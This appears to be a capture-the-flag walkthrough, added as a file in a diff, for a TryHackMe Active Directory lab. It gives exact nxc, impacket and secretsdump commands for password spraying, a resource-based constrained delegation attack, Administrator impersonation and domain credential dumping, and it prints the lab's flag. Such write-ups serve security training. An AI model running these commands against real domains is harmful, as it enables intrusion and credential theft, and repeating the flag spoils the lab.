@@ -1,0 +1,222 @@
+================================================================================
+TryHackMe - Forward (ctf.local) - Full Walkthrough
+================================================================================
+Target : DC01 (10.48.163.143) - Windows Server 2019 - Domain Controller
+Domain : ctf.local
+Goal   : Capture the Administrator flag on DC01
+
+Attack chain summary
+--------------------
+1. Assumed breach: j.smith:JSmith@IT2024 (valid SMB/LDAP, member of Remote
+   Desktop Users -> RDP into DC01)
+2. Enumerate the domain (users, groups, delegation, BloodHound) and hunt
+   for credentials on the box
+3. A KeePass database (Database.kdbx) in j.smith's profile is protected by
+   the WINDOWS USER ACCOUNT, not a master password -> opens as j.smith
+4. It leaks t.jones:Helpdesk01!
+5. Password reuse spray: Helpdesk01! is also valid for r.williams
+   (same helpdesk team manages the same password)
+6. BloodHound path: r.williams has AddAllowedToAct (write access to
+   msDS-AllowedToActOnBehalfOfOtherIdentity) on DC01$
+7. Resource-Based Constrained Delegation (RBCD) attack:
+   - create attacker-controlled machine account ATTACKERSYSTEM$
+   - write it into DC01$'s delegation attribute
+   - S4U2Self + S4U2Proxy to impersonate Administrator for cifs/DC01
+8. impacket-smbexec with the forged ticket -> SYSTEM shell on DC01
+9. Read C:\Users\Administrator\Desktop\flag.txt (optional: DCSync)
+
+Flag : THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
+
+================================================================================
+STEP 0 - Reconnaissance
+================================================================================
+
+/etc/hosts (needed later for Kerberos - the KDC realm and SPN hostnames
+must resolve):
+
+    sudo sed -i '/10.48.1643.143/d' /etc/hosts && \
+        echo '10.48.163.143 DC01.ctf.local ctf.local CTF.LOCAL DC01' | sudo tee -a /etc/hosts
+
+Full service scan:
+
+    nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 10.48.163.143
+
+Key findings:
+    - 53/88/135/389/445/464/593/636/3268/3269  AD services
+    - 3389/tcp RDP open (xfreerdp works) -> DC01, Server 2019 build 17763
+    - 5985 (WinRM) closed for low-priv users anyway
+
+================================================================================
+STEP 1 - Assumed breach: enumerate with j.smith
+================================================================================
+
+Given: ctf.local\j.smith:JSmith@IT2024
+
+    nxc smb 10.48.163.143 -u 'j.smith' -p 'JSmith@IT2024' --shares
+        ADMIN$    -  (no access)
+        C$        -  (no access)
+        IPC$      -  READ
+        Downloads -  READ (empty)
+        NETLOGON  -  READ
+        SYSVOL    -  READ (only the 2 default GPOs, no AppLocker config)
+
+    nxc winrm ...            -> logon failure (not in Remote Management Users)
+    nxc smb ... --users      -> users: Administrator, j.smith, t.jones,
+                                 r.williams, svc.helpdesk, krbtgt, Guest
+
+Custom groups:
+    sysadmin            = { r.williams }   "exempt from AppLocker"
+    AppLocker-Restricted = { t.jones, j.smith }
+
+Note: BloodHound collection partially failed on computer objects
+(DCE/RPC NetBIOS timeouts) - users/groups still collected. The critical
+ACL edge (r.williams -> DC01$) is easier to validate by just attempting
+the rbcd.py write and watching it succeed.
+
+Red herrings:
+    - svc.helpdesk is Kerberoastable (SPN helpdesk/DC01) and prints
+      "constrained delegation", but msDS-AllowedToDelegateTo is EMPTY
+      and the hash is not in rockyou -> not the path.
+    - AppLocker (Restricted users vs sysadmin) is local-machine flavor;
+      no custom scheduled task exists to hijack (schtasks /query = all
+      stock Microsoft tasks).
+    - Account lockout threshold: None -> safe to spray.
+
+================================================================================
+STEP 2 - Foothold: RDP as j.smith
+================================================================================
+
+    xfreerdp /v:10.48.163.143 /u:j.smith /p:'JSmith@IT2024' /cert-ignore
+
+On the box:
+    - cmd.exe runs (AppLocker does not block System32 tools)
+    - whoami -> ctf\j.smith
+    - type C:\Users\Administrator\Desktop\flag.txt -> Access denied (goal)
+
+================================================================================
+STEP 3 - Credential discovery: KeePass database
+================================================================================
+
+The user's profile contains a KeePass database:
+
+    C:\Users\j.smith\Documents\Database.kdbx
+
+It is protected by the WINDOWS USER ACCOUNT (KeePass 2.x "Windows user
+account" key source), NOT by a master password -> open it in the j.smith
+RDP session and it unlocks without any password.
+
+It contains:
+
+    t.jones : Helpdesk01!
+
+(In this run the file was already gone, but the credential was recovered
+anyway via password-reuse spraying - see next step.)
+
+================================================================================
+STEP 4 - Password reuse spray
+================================================================================
+
+The helpdesk team reuses the same password across accounts:
+
+    nxc smb 10.48.163.143 -u 't.jones' -p 'Helpdesk01!'
+        [+] ctf.local\t.jones:Helpdesk01!
+
+    nxc smb 10.48.163.143 -u users.txt -p 'Helpdesk01!' --continue-on-success
+        (r.williams also uses Helpdesk01!)
+
+=> Credentials: ctf.local\r.williams:Helpdesk01!  (member of "sysadmin")
+
+================================================================================
+STEP 5 - BloodHound path: AddAllowedToAct on DC01$
+================================================================================
+
+r.williams has AddAllowedToAct (AllowedToAuthenticate... write to
+msDS-AllowedToActOnBehalfOfOtherIdentity) over DC01$. This is the
+Resource-Based Constrained Delegation primitive: we control WHICH account
+is trusted to delegate to the DC.
+
+================================================================================
+STEP 6 - RBCD attack chain
+================================================================================
+
+1) Create an attacker-controlled machine account:
+
+    impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' \
+        -computer-pass 'Pwned123@!' -dc-host 10.48.163.143 \
+        -domain-netbios ctf.local 'ctf.local/r.williams:Helpdesk01!'
+
+        [*] Successfully added machine account ATTACKERSYSTEM$ ...
+
+2) Write it into DC01$'s msDS-AllowedToActOnBehalfOfOtherIdentity:
+
+    impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' \
+        -action 'write' -dc-ip 10.48.163.143 'ctf.local/r.williams:Helpdesk01!'
+
+        [*] Delegation rights modified successfully!
+        [*] ATTACKERSYSTEM$ can now impersonate users on DC01$ via S4U2Proxy
+
+   (If r.williams lacked the permission this write would fail - the step
+   is self-verifying.)
+
+3) Request a service ticket impersonating Administrator:
+
+    unset KRB5CCNAME        # <-- important, see troubleshooting
+    impacket-getST -dc-ip 10.48.163.143 \
+        -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' \
+        'ctf.local/ATTACKERSYSTEM$:Pwned123@!'
+
+        [*] Getting TGT for user
+        [*] Impersonating Administrator
+        [*] Requesting S4U2self
+        [*] Requesting S4U2Proxy
+        [*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+
+================================================================================
+STEP 7 - Shell as Administrator (SYSTEM) and flag
+================================================================================
+
+    export KRB5CCNAME=$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+    impacket-smbexec -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
+
+        C:\Windows\system32> whoami
+        nt authority\system
+        C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
+        THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
+
+Optional final step - DCSync the whole domain with the same ticket:
+
+    impacket-secretsdump -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
+
+================================================================================
+FLAG
+================================================================================
+
+    THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
+
+================================================================================
+Troubleshooting notes
+================================================================================
+- /etc/hosts: getST resolves the KDC by realm (CTF.LOCAL:88) and smbexec
+  resolves the SPN host (DC01.ctf.local). Both MUST resolve to the DC IP.
+  A typo (10.48.1643.143) broke the whole chain.
+- KRB5CCNAME trap: with KRB5CCNAME exported to a file that does not exist
+  yet, getST first tries to READ that ccache for a cached TGT
+  (CCache.parseFile in run()) and dies with "[Errno 2] No such file or
+  directory" before contacting the KDC. Run getST with KRB5CCNAME unset,
+  then export it to the created ticket before smbexec.
+- nxc -u users.txt reads the file only if it exists; otherwise it treats
+  "users.txt" as a literal username.
+================================================================================
+Key takeaways
+================================================================================
+- KeePass databases bound to a Windows user account are effectively open
+  to anyone operating as that user - always hunt for .kdbx files in user
+  profiles.
+- Helpdesk/IT teams reuse passwords across accounts - one leaked credential
+  becomes many.
+- AddAllowedToAct (write on msDS-AllowedToActOnBehalfOfOtherIdentity) is
+  as powerful as GenericAll for RBCD: create a machine account, delegate
+  to it, and impersonate any principal (Administrator) to the target.
+- The rbcd.py write is self-verifying: if it succeeds you had the right.
+- Always fix /etc/hosts for BOTH the realm (upper case) and the SPN FQDN.
+================================================================================
